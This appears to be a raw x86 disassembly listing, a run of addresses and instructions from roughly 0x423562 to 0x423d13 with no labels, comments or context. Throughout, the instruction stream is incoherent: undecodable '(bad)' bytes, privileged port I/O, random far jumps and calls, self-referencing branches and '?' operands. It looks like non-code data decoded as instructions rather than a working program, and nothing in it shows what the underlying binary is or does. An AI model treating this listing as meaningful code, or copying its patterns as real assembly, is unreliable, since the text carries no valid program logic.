  423562:	sub    DWORD PTR [eax+0x30553b4f],esi
  423568:	int3   
  423569:	or     al,0xad
  42356b:	inc    edx
  42356c:	aas    
  42356d:	mov    esp,0xd5ee0547
  423572:	ins    DWORD PTR es:[edi],dx
  423573:	bound  esi,QWORD PTR [edi]
  423575:	or     edi,DWORD PTR [edi+edx*1+0x5dc5a342]
  42357c:	ret    
  42357d:	cmp    ecx,DWORD PTR [edi+0x61595f37]
  423583:	xchg   edi,eax
  423584:	stc    
  423585:	or     al,0x1f
  423587:	mov    es,WORD PTR ds:0x58179b09
  42358d:	and    dl,BYTE PTR cs:[ebp+0x43b0a3b8]
  423594:	pusha  
  423595:	xchg   ebp,eax
  423596:	fisub  DWORD PTR [ebx+ebp*4]
  423599:	lds    edi,FWORD PTR [eax-0x3556ee52]
  42359f:	pushf  
  4235a0:	sahf   
  4235a1:	jl     0x4235a1
  4235a3:	or     BYTE PTR [esi+edi*2-0x66],0x82
  4235a8:	stc    
  4235a9:	xchg   ecx,eax
  4235aa:	inc    eax
  4235ab:	imul   eax,DWORD PTR [eax],0xffffff87
  4235ae:	hlt    
  4235af:	push   ecx
  4235b0:	push   ebx
  4235b1:	pop    edx
  4235b2:	rcr    ebp,1
  4235b4:	gs mov bh,0x97
  4235b7:	pop    es
  4235b8:	lds    eax,FWORD PTR [eax+0x2972a191]
  4235be:	or     eax,0x193abe57
  4235c3:	int    0x71
  4235c5:	jp     0x4235e5
  4235c7:	pop    edx
  4235c8:	add    ah,bl
  4235ca:	in     eax,dx
  4235cb:	stos   BYTE PTR es:[edi],al
  4235cc:	in     eax,dx
  4235cd:	sub    bl,BYTE PTR [edx-0x27aecd9c]
  4235d3:	sbb    al,BYTE PTR [eax]
  4235d5:	mov    dl,0xd
  4235d7:	ds ret 0xcefb
  4235db:	add    eax,0x65fd31ff
  4235e0:	or     BYTE PTR [esi+edi*1],ch
  4235e3:	and    DWORD PTR [ebx],ecx
  4235e5:	mov    bh,0x59
  4235e7:	inc    esp
  4235e8:	cmp    dh,bh
  4235ea:	xor    DWORD PTR [edi],ecx
  4235ec:	push   esi
  4235ed:	cdq    
  4235ee:	xlat   BYTE PTR ds:[ebx]
  4235ef:	adc    eax,0xffffffe5
  4235f2:	scas   eax,DWORD PTR es:[edi]
  4235f3:	mov    ecx,ecx
  4235f5:	push   esp
  4235f6:	out    dx,eax
  4235f7:	daa    
  4235f8:	pop    esp
  4235f9:	adc    eax,0x344a56e6
  4235fe:	(bad)  
  4235ff:	sub    BYTE PTR [ebx+0x5a060aa2],al
  423605:	mov    ds:0x2b9b99d5,eax
  42360a:	xor    cl,BYTE PTR [eax-0x25]
  42360d:	into   
  42360e:	fisubr WORD PTR [edi-0x1f3a343c]
  423614:	xlat   BYTE PTR ds:[ebx]
  423615:	out    dx,al
  423616:	jns    0x423621
  423618:	imul   esp,ebx,0xe2fafdf4
  42361e:	xchg   edx,eax
  42361f:	and    al,al
  423621:	push   cs
  423622:	pusha  
  423623:	repnz push es
  423625:	aaa    
  423626:	pusha  
  423627:	pop    ecx
  423628:	mov    ds:0xb1880246,eax
  42362d:	fstp   TBYTE PTR [ecx+ecx*4]
  423630:	aad    0xad
  423632:	and    bl,BYTE PTR [ebp+0x28]
  423635:	(bad)  
  423636:	cli    
  423637:	or     BYTE PTR [eax-0x16c0d1de],bl
  42363d:	retf   0xdb62
  423640:	mov    WORD PTR [esi+0x6c],?
  423643:	in     eax,0x8
  423645:	jl     0x4236b0
  423647:	jno    0x42361e
  423649:	mov    DWORD PTR [edi-0x4e],esp
  42364c:	enter  0x1cda,0x84
  423650:	enter  0x8d3,0x38
  423654:	sub    eax,0x4168c77b
  423659:	es jg  0x42365e
  42365c:	xor    BYTE PTR [esp+edi*1+0xc8c13d4],bh
  423663:	jle    0x423600
  423665:	push   ebx
  423666:	mov    ah,0x1e
  423668:	bound  edx,QWORD PTR [edi-0x729f6acc]
  42366e:	imul   esi,DWORD PTR [ecx-0x4],0x12
  423672:	jge    0x4236b2
  423674:	and    DWORD PTR [edi],esi
  423676:	fld    QWORD PTR [bp+di]
  423679:	repz std 
  42367b:	push   edi
  42367c:	out    dx,al
  42367d:	stos   DWORD PTR es:[edi],eax
  42367e:	js     0x42369f
  423680:	xor    ch,BYTE PTR [edi-0x4d]
  423683:	repnz xor DWORD PTR [edx+0x65],esp
  423687:	mov    dh,0x4
  423689:	sbb    bl,dl
  42368b:	sub    DWORD PTR [ebp-0x22],eax
  42368e:	outs   dx,DWORD PTR ds:[esi]
  42368f:	stos   DWORD PTR es:[edi],eax
  423690:	push   0x25250f3b
  423695:	pop    esp
  423696:	jo     0x42362b
  423698:	fadd   DWORD PTR [edx-0x42c980ae]
  42369e:	in     al,dx
  42369f:	dec    ecx
  4236a0:	inc    ecx
  4236a1:	xor    eax,0xb125edc7
  4236a6:	push   edi
  4236a7:	mov    WORD PTR [ebx],es
  4236a9:	or     eax,0x91f39201
  4236ae:	push   ecx
  4236b0:	mov    al,0x54
  4236b2:	daa    
  4236b3:	and    BYTE PTR [edi+eax*4-0x7b7b7a74],bl
  4236ba:	aam    0x9f
  4236bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236bd:	inc    ebp
  4236be:	(bad)  
  4236bf:	fnstenv [esi-0x7e]
  4236c2:	sub    cl,ch
  4236c4:	and    eax,0xe7635ffe
  4236c9:	mov    edx,DWORD PTR [edi-0x40839624]
	...
  4236d7:	add    BYTE PTR [eax],al
  4236d9:	add    dl,dl
  4236db:	and    dl,BYTE PTR [esi-0x21410966]
  4236e1:	push   0x61
  4236e3:	push   cs
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	dec    edi
  4236e7:	sub    ebx,DWORD PTR [esi+0x1d]
  4236ea:	ret    
  4236eb:	mov    al,0x1
  4236ed:	add    ch,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    bh,bl
  4236f3:	mov    al,ds:0x2d86ff74
  4236f8:	sub    eax,0xe0b78acd
  4236fd:	test   al,0x54
  4236ff:	cmp    cl,al
  423701:	fcom   QWORD PTR ds:0x3097b2a9
  423707:	adc    BYTE PTR [ebp-0x2d958ffa],bl
  42370d:	pop    ecx
  42370e:	jg     0x423735
  423710:	xlat   BYTE PTR ds:[ebx]
  423711:	(bad)  
  423712:	iret   
  423713:	or     BYTE PTR [edx],cl
  423715:	or     dl,BYTE PTR [eax+0x25]
  423718:	or     bh,BYTE PTR [ecx+eiz*8+0x660bacf6]
  42371f:	and    al,0x7c
  423721:	add    bl,BYTE PTR [edx-0x40]
  423724:	push   es
  423725:	mov    edx,0x1114e2d9
  42372a:	sbb    DWORD PTR [ebp+0x7968d3e1],ebp
  423730:	xchg   ebp,eax
  423731:	mov    bl,0x73
  423733:	repnz clc 
  423735:	or     BYTE PTR [ebp-0x2f2f19b8],dl
  42373b:	and    al,0x40
  42373d:	push   es
  42373e:	and    ebp,ebp
  423740:	mov    ds:0x11dd652f,al
  423745:	test   edi,edi
  423747:	dec    esi
  423748:	in     al,dx
  423749:	and    al,0x89
  42374b:	dec    esi
  42374c:	lods   eax,DWORD PTR ds:[esi]
  42374d:	lds    esi,FWORD PTR ds:0x1a07cbaa
  423753:	fisub  DWORD PTR [edx+0x4f]
  423756:	inc    edi
  423757:	sbb    dh,ch
  423759:	jecxz  0x4236f1
  42375b:	pop    esi
  42375c:	enter  0x796a,0xe4
  423760:	xor    ecx,esp
  423762:	cwde   
  423763:	push   es
  423764:	es mov bl,0xe9
  423767:	mov    cl,0x4d
  423769:	and    DWORD PTR [edi+0x24b0d5c4],eax
  42376f:	add    al,0xae
  423771:	dec    ebp
  423772:	jp     0x4237de
  423774:	popf   
  423775:	in     al,dx
  423776:	lods   al,BYTE PTR ds:[esi]
  423777:	mov    bh,0x78
  423779:	xchg   edi,eax
  42377a:	and    BYTE PTR [ecx],dh
  42377c:	pop    ds
  42377d:	pop    ds
  42377e:	jo     0x4237ce
  423780:	xchg   DWORD PTR [eiz*2-0x1a2822d0],ebp
  423787:	cld    
  423788:	xchg   ecx,eax
  423789:	mov    al,cl
  42378b:	jns    0x4237f7
  42378d:	or     eax,DWORD PTR [edi+0x429d9459]
  423793:	mov    ecx,ebp
  423795:	push   ebx
  423796:	xor    eax,edi
  423798:	xor    esp,DWORD PTR [esi-0x390c84fe]
  42379e:	adc    eax,0x27ad12cf
  4237a3:	(bad)  
  4237a4:	cmp    BYTE PTR [ecx+ebp*2],ch
  4237a7:	ins    DWORD PTR es:[edi],dx
  4237a8:	adc    al,0xb1
  4237aa:	fcomip st,st(1)
  4237ac:	and    eax,0xa6aaed6e
  4237b1:	aas    
  4237b2:	sar    BYTE PTR [edi+0x5c8f3396],cl
  4237b8:	test   DWORD PTR [esi-0x6354c9a7],eax
  4237be:	and    al,0x35
  4237c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237c1:	push   ebp
  4237c2:	(bad)  
  4237c4:	inc    edx
  4237c5:	add    ch,bl
  4237c7:	inc    esi
  4237c8:	sbb    BYTE PTR [edi-0x3544194],al
  4237ce:	adc    BYTE PTR ds:0xced9a901,bl
  4237d4:	cli    
  4237d5:	adc    DWORD PTR ds:0x9c5d3054,ecx
  4237db:	in     eax,dx
  4237dc:	jbe    0x4237d7
  4237de:	lahf   
  4237df:	iret   
  4237e0:	jmp    0x9ec5:0xe60a5192
  4237e7:	fidiv  DWORD PTR [ecx-0x6bab7a28]
  4237ed:	jbe    0x4237cd
  4237ef:	cmp    eax,0xd832831f
  4237f4:	dec    esp
  4237f5:	inc    ecx
  4237f6:	sbb    eax,0x2c21cce5
  4237fb:	fisub  DWORD PTR [edx]
  4237fd:	test   esi,0xb78aa310
  423803:	add    ecx,eax
  423805:	mov    ebx,0xd826d175
  42380a:	std    
  42380b:	add    DWORD PTR [ebx+0x2d6d93cb],ecx
  423811:	je     0x42383a
  423813:	push   ss
  423814:	in     al,0xcf
  423816:	icebp  
  423817:	lahf   
  423818:	mov    esi,0xf3e077a5
  42381d:	or     eax,0x31f15b53
  423822:	xor    al,0xc7
  423824:	add    ebp,DWORD PTR [eax]
  423826:	dec    edi
  423827:	add    bh,BYTE PTR [edi+0x10]
  42382a:	shl    BYTE PTR [ebp-0x339f01b6],0x29
  423831:	mov    ds:0x634c2ee3,al
  423836:	fwait
  423837:	push   esi
  423838:	adc    edx,edi
  42383a:	fwait
  42383b:	mov    cl,0x26
  42383d:	push   esp
  42383e:	loope  0x423861
  423840:	bound  ebx,QWORD PTR [eax+0x6fbd9f0e]
  423846:	popa   
  423847:	inc    ebx
  423848:	pop    edi
  423849:	sar    DWORD PTR [esi+ebx*4-0x6c],cl
  42384d:	call   0xc5a8ecc1
  423852:	jae    0x423877
  423854:	cmp    eax,0xccc8f654
  423859:	test   esi,ecx
  42385b:	or     dh,BYTE PTR [edx]
  42385d:	in     eax,dx
  42385e:	push   ecx
  42385f:	push   0x72
  423861:	jns    0x42381a
  423863:	mov    al,ds:0xa6e3d0be
  423868:	xchg   esp,eax
  423869:	pop    edi
  42386a:	inc    ecx
  42386b:	mov    ecx,0x7becd9c
  423870:	mov    al,ds:0x3bb25ec0
  423875:	test   DWORD PTR [esp+esi*1-0x9f0668],edi
  42387c:	(bad)  
  42387d:	jne    0x423871
  42387f:	xor    esp,DWORD PTR [esi]
  423881:	dec    ebx
  423882:	jbe    0x423874
  423884:	pop    edx
  423885:	sbb    ch,dl
  423887:	leave  
  423888:	dec    ebx
  423889:	das    
  42388a:	fs jmp 0x84ff:0x1017d0cb
  423892:	fst    QWORD PTR [ecx-0x5b064d1a]
  423898:	dec    ebp
  423899:	pop    eax
  42389a:	xchg   esi,eax
  42389b:	mov    eax,0x6ef250ab
  4238a0:	mov    ecx,0x47ae8e88
  4238a5:	adc    BYTE PTR [ebp+0x6a3f1d31],ah
  4238ab:	mov    ecx,0x36c09fc4
  4238b0:	call   edi
  4238b2:	xchg   esi,eax
  4238b3:	pop    ecx
  4238b4:	fistp  WORD PTR [esi+0x23]
  4238b7:	sub    edx,ecx
  4238b9:	push   ebx
  4238ba:	(bad)  
  4238bb:	(bad)  [ebx-0x77a4490f]
  4238c1:	xchg   edi,eax
  4238c2:	xchg   edi,eax
  4238c3:	xchg   edx,eax
  4238c4:	xor    eax,0x399cf86f
  4238c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238ca:	aam    0x46
  4238cc:	dec    ebp
  4238cd:	mov    ebx,0x657e4530
  4238d2:	ins    DWORD PTR es:[edi],dx
  4238d3:	aas    
  4238d4:	imul   BYTE PTR [esi+0x65]
  4238d7:	xchg   esp,eax
  4238d8:	aad    0x7
  4238da:	push   edi
  4238db:	in     al,dx
  4238dc:	add    BYTE PTR [ebx-0x78],bl
  4238df:	leave  
  4238e0:	xor    al,0x8e
  4238e2:	mov    BYTE PTR ds:0xa0158a4c,ah
  4238e8:	test   eax,0x246e5dac
  4238ed:	sbb    DWORD PTR [ecx+0x0],eax
	...
  4238f8:	add    BYTE PTR [eax],al
  4238fa:	fnstsw WORD PTR [edi+ecx*4]
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	(bad)  
  423907:	pop    edx
  423908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423909:	add    eax,eax
  42390b:	mov    dl,0x1
  42390d:	add    ch,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [edx+ebx*8-0x1],dl
  423915:	sti    
  423916:	nop
  423917:	or     cl,BYTE PTR [edx+0x32]
  42391a:	aam    0xde
  42391c:	fadd   DWORD PTR [esi+0x1f86bd26]
  423922:	jl     0x423964
  423924:	cmp    BYTE PTR [ecx-0x667d987d],bh
  42392a:	ins    DWORD PTR es:[edi],dx
  42392b:	or     DWORD PTR [ebx+ebx*4+0xc],esi
  42392f:	fwait
  423930:	aaa    
  423931:	ins    BYTE PTR es:[edi],dx
  423932:	into   
  423933:	dec    bx
  423935:	out    0x7d,eax
  423937:	xchg   edi,eax
  423938:	adc    DWORD PTR [esi-0x42],0x1e
  42393c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42393d:	and    al,cl
  42393f:	mov    dh,0x6e
  423941:	xchg   ecx,eax
  423942:	sub    esp,ebx
  423944:	rcl    BYTE PTR ds:0xcd317bba,0x92
  42394b:	mov    ebp,0xb63284c8
  423950:	xor    bl,0x5f
  423953:	lods   eax,DWORD PTR ds:[esi]
  423954:	pop    edi
  423955:	adc    eax,0xa47b6e66
  42395a:	mov    dh,0x5f
  42395c:	test   al,0xb9
  42395e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42395f:	lods   eax,DWORD PTR ds:[esi]
  423960:	cmp    ch,bh
  423962:	test   al,0xac
  423964:	cmp    BYTE PTR [esi],bl
  423966:	dec    eax
  423967:	jle    0x423930
  423969:	arpl   WORD PTR ds:0xc7e3dd13,bp
  42396f:	ins    DWORD PTR es:[edi],dx
  423970:	aaa    
  423971:	adc    edi,esp
  423973:	xor    ebp,DWORD PTR [ecx+0x3bec65a1]
  423979:	xchg   edx,eax
  42397a:	fadd   DWORD PTR [ebx+0x5d121a43]
  423980:	(bad)  
  423981:	arpl   WORD PTR [edi+0x46],bp
  423984:	mov    bl,0xff
  423986:	sbb    esp,DWORD PTR [esi]
  423988:	jo     0x42396e
  42398a:	mov    ch,0x75
  42398c:	dec    edi
  42398d:	(bad)  
  42398e:	(bad)  
  42398f:	test   al,0xc2
  423991:	rcl    BYTE PTR [eax+0x666f9c29],1
  423997:	xchg   BYTE PTR [ecx+0x52],ch
  42399a:	sbb    al,BYTE PTR [ebx]
  42399c:	jmp    0xcce:0x76cbe7a2
  4239a3:	shr    BYTE PTR [edi],0xf7
  4239a6:	mov    WORD PTR fs:[ebx],fs
  4239a9:	into   
  4239aa:	adc    ah,BYTE PTR [edx]
  4239ac:	mov    es,WORD PTR [edx+0x6aa1a4ff]
  4239b2:	adc    ebx,DWORD PTR [edx]
  4239b4:	cmp    BYTE PTR [edi],dh
  4239b6:	sub    ebp,edx
  4239b8:	sub    BYTE PTR [edi+0x4c71c3e3],0xae
  4239bf:	leave  
  4239c0:	xchg   esp,eax
  4239c1:	std    
  4239c2:	icebp  
  4239c3:	jl     0x4239ae
  4239c5:	sbb    ebp,ebp
  4239c7:	pop    esi
  4239c8:	cs mov esi,0x7db01ff8
  4239ce:	push   ss
  4239cf:	ins    DWORD PTR es:[edi],dx
  4239d0:	clc    
  4239d1:	outs   dx,BYTE PTR ds:[esi]
  4239d2:	sbb    eax,0x7f95047c
  4239d7:	(bad)  
  4239d8:	mov    ah,0x55
  4239da:	inc    ebx
  4239db:	mov    ecx,0xad5162ba
  4239e0:	mov    eax,DWORD PTR [edx-0x76b0158e]
  4239e6:	jnp    0x423992
  4239e8:	push   ss
  4239e9:	sub    ecx,ebx
  4239eb:	and    BYTE PTR [esi-0x7321214d],al
  4239f1:	inc    edi
  4239f2:	shl    BYTE PTR [esi-0x37],cl
  4239f5:	test   al,0x92
  4239f7:	lds    edx,FWORD PTR [edx+0x5b]
  4239fa:	push   esp
  4239fb:	retf   
  4239fc:	cmp    DWORD PTR [esi+0xfbf7277],ebx
  423a02:	and    eax,0x3e71193
  423a07:	ins    BYTE PTR es:[edi],dx
  423a08:	jecxz  0x423a86
  423a0a:	cmp    eax,0xa4927a88
  423a0f:	cwde   
  423a10:	icebp  
  423a11:	mov    esp,0x2983c7f5
  423a16:	aas    
  423a17:	in     eax,dx
  423a18:	sub    eax,0x9f026ff7
  423a1d:	ds adc edi,esp
  423a20:	inc    ebx
  423a21:	mov    dh,0x8
  423a23:	xchg   esi,eax
  423a24:	jmp    0x423a14
  423a26:	add    ebp,edi
  423a28:	mov    ebp,0x946ee587
  423a2d:	ret    
  423a2e:	dec    edx
  423a2f:	push   esp
  423a30:	dec    edi
  423a31:	mov    bh,0x82
  423a33:	lahf   
  423a34:	ins    BYTE PTR es:[edi],dx
  423a35:	rol    DWORD PTR [esi+0x7fddaa84],cl
  423a3b:	(bad)  
  423a3c:	jnp    0x4239c5
  423a3e:	cmp    al,BYTE PTR [edi+0x5]
  423a41:	fsubp  st(7),st
  423a43:	nop
  423a44:	lock imul esi,edi,0xa12437e6
  423a4b:	les    ebp,FWORD PTR [eax]
  423a4d:	or     eax,0x659662df
  423a52:	pop    ecx
  423a53:	ins    BYTE PTR es:[edi],dx
  423a54:	jmp    0x4239f3
  423a56:	faddp  st(4),st
  423a58:	mov    cl,0xa1
  423a5a:	cli    
  423a5b:	cmp    cl,BYTE PTR [edi+eiz*8-0x4faa9dfe]
  423a62:	repz out dx,al
  423a64:	jge    0x423a77
  423a66:	outs   dx,BYTE PTR ds:[esi]
  423a67:	sbb    edi,DWORD PTR ss:[ecx]
  423a6a:	(bad)  
  423a6b:	pop    edx
  423a6c:	mov    ebp,0xdfc6f9ab
  423a71:	sub    eax,0xa6701c92
  423a76:	mov    ecx,0x161000d
  423a7b:	test   al,0x9c
  423a7d:	add    edi,DWORD PTR es:[edi+esi*2]
  423a81:	ror    esp,1
  423a83:	popa   
  423a84:	push   eax
  423a85:	or     ecx,DWORD PTR [esi+0x4f030351]
  423a8b:	xor    ah,BYTE PTR [edx+edi*2]
  423a8e:	or     BYTE PTR [edi-0xe],bl
  423a91:	cld    
  423a92:	mov    dl,al
  423a94:	inc    ebp
  423a95:	dec    ebp
  423a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a97:	mov    ebx,0x46799ac3
  423a9c:	inc    esi
  423a9d:	adc    ah,BYTE PTR [edi+edx*4]
  423aa0:	bswap  eax
  423aa2:	test   BYTE PTR [eax+0x29],ch
  423aa5:	jp     0x423a55
  423aa7:	(bad)  
  423aa8:	es cmp DWORD PTR fs:[eax-0x2bef8c8f],ecx
  423ab0:	lock shl BYTE PTR [eax+eiz*8-0x27],0xb8
  423ab6:	mov    WORD PTR [ecx-0x66],ds
  423ab9:	and    eax,0xa492caae
  423abe:	sub    al,0x7a
  423ac0:	xlat   BYTE PTR ds:[ebx]
  423ac1:	adc    ah,cl
  423ac3:	shr    eax,0x9e
  423ac6:	push   esp
  423ac7:	shl    DWORD PTR [ecx-0x79940fdb],1
  423acd:	(bad)  
  423ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423acf:	jne    0x423b40
  423ad1:	popf   
  423ad2:	ins    BYTE PTR es:[edi],dx
  423ad3:	retf   
  423ad4:	test   DWORD PTR [ecx+0x1b],esp
  423ad7:	lods   al,BYTE PTR ds:[esi]
  423ad8:	jbe    0x423a87
  423ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423adb:	adc    al,BYTE PTR [eax]
  423add:	repz shl DWORD PTR [edi-0x50],cl
  423ae1:	int3   
  423ae2:	mov    WORD PTR [edx-0x7e],?
  423ae5:	fwait
  423ae6:	xchg   DWORD PTR [ecx-0x77],edx
  423ae9:	push   ecx
  423aea:	xor    eax,0x3762db79
  423aef:	pushf  
  423af0:	push   es
  423af1:	cs (bad) 
  423af3:	push   edx
  423af4:	(bad)  
  423af5:	in     eax,0x35
  423af7:	popa   
  423af8:	mov    WORD PTR [ecx],es
  423afa:	xor    al,0xec
  423afc:	ret    0xab01
  423aff:	jmp    0x423b78
  423b01:	mov    BYTE PTR [esi+0x10],ch
  423b04:	xor    al,0x62
  423b06:	and    al,0xae
  423b08:	mov    esi,0x14dd30e
  423b0d:	mov    DWORD PTR [esi],ebx
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b53
  423b27:	mov    al,ds:0xb4bd5cae
  423b2c:	add    DWORD PTR [eax],eax
  423b2e:	std    
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [edx+eiz*1-0x4b3b5415],cl
  423b38:	xchg   edx,eax
  423b39:	mov    bh,0x46
  423b3b:	sub    eax,eax
  423b3d:	stos   DWORD PTR es:[edi],eax
  423b3e:	jecxz  0x423ba8
  423b40:	pop    es
  423b41:	fdecstp 
  423b43:	aaa    
  423b44:	mov    eax,0x390c6917
  423b49:	idiv   BYTE PTR [ebp+0x7bd3e604]
  423b4f:	adc    eax,0x7aeb48b7
  423b54:	push   edi
  423b55:	push   ds
  423b56:	push   esp
  423b57:	lds    edx,FWORD PTR [ebp+0x74721d22]
  423b5d:	lock out dx,al
  423b5f:	out    dx,al
  423b60:	das    
  423b61:	fnstenv [edi]
  423b63:	icebp  
  423b64:	das    
  423b65:	cmp    eax,DWORD PTR [esi+0x356183a9]
  423b6b:	fstp   QWORD PTR [ebp-0xb]
  423b6e:	xchg   esi,eax
  423b6f:	adc    al,0xcf
  423b71:	ret    
  423b72:	or     al,0xe0
  423b74:	xor    cl,BYTE PTR [ebp+0x44]
  423b77:	sbb    DWORD PTR [edi],eax
  423b79:	xor    esp,DWORD PTR [edx]
  423b7b:	stos   BYTE PTR es:[edi],al
  423b7c:	ret    0x8d3e
  423b7f:	pop    eax
  423b80:	push   ecx
  423b81:	mov    ds:0x91f44496,eax
  423b86:	mov    cl,0xf0
  423b88:	sub    al,BYTE PTR [esi]
  423b8a:	test   bl,al
  423b8c:	cwde   
  423b8d:	or     dh,BYTE PTR [ebx+0x5fbfeda8]
  423b93:	mov    al,0x5c
  423b95:	mov    ebx,0xbc229d83
  423b9a:	xor    esi,0x10
  423b9d:	sahf   
  423b9e:	ds addr16 mov ecx,0xc807fbbc
  423ba5:	push   ebx
  423ba6:	and    BYTE PTR [edi],ah
  423ba8:	mov    edi,0x4d846bbe
  423bad:	repz mov ds:0x6c013f71,eax
  423bb3:	add    eax,0x89ab719b
  423bb8:	jo     0x423bca
  423bba:	ins    BYTE PTR es:[edi],dx
  423bbb:	aas    
  423bbc:	enter  0x6f8c,0xd6
  423bc0:	xchg   edx,eax
  423bc1:	out    0xd4,eax
  423bc3:	dec    ebx
  423bc4:	add    al,0xeb
  423bc6:	xchg   edi,eax
  423bc7:	adc    dh,dl
  423bc9:	popf   
  423bca:	les    ecx,FWORD PTR [esi+0x6]
  423bcd:	inc    ecx
  423bce:	cld    
  423bcf:	jnp    0x423bdf
  423bd1:	sbb    ebp,DWORD PTR [eax]
  423bd3:	stos   BYTE PTR es:[edi],al
  423bd4:	addr16 std 
  423bd6:	out    dx,al
  423bd7:	nop
  423bd8:	xor    edi,DWORD PTR [ebx+eax*2]
  423bdb:	mov    WORD PTR [eax],ds
  423bdd:	sbb    ah,BYTE PTR [eax+0x77]
  423be0:	jbe    0x423b79
  423be2:	xor    al,0x61
  423be4:	aaa    
  423be5:	inc    ebx
  423be6:	and    al,0x87
  423be8:	jmp    FWORD PTR [ebp+0x2e2c0e7a]
  423bee:	pop    esi
  423bef:	push   ds
  423bf0:	enter  0xafac,0xdb
  423bf4:	jno    0x423bf0
  423bf6:	nop
  423bf7:	pop    edi
  423bf8:	cwde   
  423bf9:	sub    al,0x45
  423bfb:	hlt    
  423bfc:	push   esp
  423bfd:	sub    dh,ch
  423bff:	dec    ebx
  423c00:	mov    bl,0x2a
  423c02:	es jl  0x423bf1
  423c05:	add    eax,0xe2814cb0
  423c0a:	mov    ecx,0xf559f027
  423c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c10:	stos   BYTE PTR es:[edi],al
  423c11:	pop    ebx
  423c12:	nop
  423c13:	pop    esp
  423c14:	push   cs
  423c15:	pop    ecx
  423c16:	js     0x423c3e
  423c18:	popf   
  423c19:	inc    edi
  423c1a:	test   eax,0xedc86e02
  423c1f:	bound  ebx,QWORD PTR [ebp+0x6c]
  423c22:	jmp    FWORD PTR [ebx+0x6dbeca02]
  423c28:	or     BYTE PTR ds:0x4379849a,0x3f
  423c2f:	popf   
  423c30:	out    0x23,al
  423c32:	mov    cl,0xfc
  423c34:	loop   0x423c4c
  423c36:	sub    ebx,DWORD PTR [edx+0x7797b0f3]
  423c3c:	xchg   ecx,eax
  423c3d:	jle    0x423cbe
  423c3f:	ds dec ebx
  423c41:	ror    DWORD PTR [ebx+0x68160b64],0xdf
  423c48:	inc    ebp
  423c49:	jecxz  0x423ca1
  423c4b:	jle    0x423bdd
  423c4d:	xor    esi,eax
  423c4f:	jmp    0x423c89
  423c51:	scas   eax,DWORD PTR es:[edi]
  423c52:	out    0x56,al
  423c54:	mov    edx,0xc991d0ce
  423c59:	dec    edx
  423c5a:	pop    eax
  423c5b:	jo     0x423cbf
  423c5d:	cmp    al,BYTE PTR [ecx+eiz*1]
  423c60:	fiadd  DWORD PTR [ebp+edi*4-0x7d2f81e]
  423c67:	cli    
  423c68:	adc    ebx,ebx
  423c6a:	xchg   ecx,eax
  423c6b:	lods   eax,DWORD PTR ds:[esi]
  423c6c:	(bad)  
  423c6d:	icebp  
  423c6e:	cmc    
  423c6f:	ins    DWORD PTR es:[edi],dx
  423c70:	jae    0x423c07
  423c72:	cmp    al,0xe2
  423c74:	(bad)  
  423c75:	pop    edx
  423c76:	cmp    DWORD PTR [ebx+0x2e],esp
  423c79:	inc    ebx
  423c7a:	(bad)  
  423c7b:	xor    BYTE PTR [ebx],dl
  423c7d:	dec    ecx
  423c7e:	(bad)  
  423c80:	mov    bh,0xa7
  423c82:	(bad)  
  423c83:	sbb    BYTE PTR [esi],ch
  423c85:	jo     0x423d04
  423c87:	inc    ecx
  423c88:	retf   
  423c89:	push   edi
  423c8a:	mov    ebp,0x9ba3c073
  423c8f:	std    
  423c90:	test   al,0x3d
  423c92:	cmp    ch,BYTE PTR [ecx-0x1]
  423c95:	(bad)  
  423c96:	out    dx,al
  423c97:	jge    0x423ca8
  423c99:	aaa    
  423c9a:	into   
  423c9b:	or     edi,DWORD PTR [eax-0x5f]
  423c9e:	dec    esp
  423c9f:	cdq    
  423ca0:	sbb    esp,esi
  423ca2:	je     0x423d0a
  423ca4:	stc    
  423ca5:	mov    cl,0xcd
  423ca7:	xor    al,BYTE PTR [ebx-0x78e848c7]
  423cad:	shr    esi,cl
  423caf:	mov    esi,0x15b1a9be
  423cb4:	(bad)  
  423cb5:	and    BYTE PTR [ecx],ah
  423cb7:	in     eax,0x84
  423cb9:	adc    BYTE PTR [esi-0x3725f79b],0x91
  423cc0:	dec    esp
  423cc1:	cdq    
  423cc2:	inc    esp
  423cc3:	inc    DWORD PTR [ebp+0x74]
  423cc6:	clc    
  423cc7:	dec    esp
  423cc8:	loop   0x423c9e
  423cca:	jle    0x423c79
  423ccc:	test   DWORD PTR [edx-0x3229c0b9],esi
  423cd2:	scas   al,BYTE PTR es:[edi]
  423cd3:	sub    eax,0x1604ce4e
  423cd8:	pop    esi
  423cd9:	or     ebp,DWORD PTR [edi-0x25]
  423cdc:	or     BYTE PTR [ecx-0x68],dh
  423cdf:	xor    esp,DWORD PTR [ecx-0x38]
  423ce2:	cdq    
  423ce3:	outs   dx,BYTE PTR ds:[esi]
  423ce4:	push   eax
  423ce5:	out    0x5c,al
  423ce7:	mov    ebx,0xce77d821
  423cec:	or     BYTE PTR [edi+0x5c130947],dl
  423cf2:	out    0xc8,eax
  423cf4:	sahf   
  423cf5:	aaa    
  423cf6:	mov    ds:0x5dfc8152,eax
  423cfb:	lock mov ecx,DWORD PTR [esi]
  423cfe:	jne    0x423ca9
  423d00:	nop
  423d01:	adc    bh,BYTE PTR [ecx]
  423d03:	push   esp
  423d04:	mov    bl,BYTE PTR [esi]
  423d06:	jecxz  0x423c9f
  423d08:	dec    esi
  423d09:	and    al,BYTE PTR [edi-0x40025709]
  423d0f:	(bad)  
  423d10:	leave  
  423d11:	gs cmc 
  423d13:	(bad)  
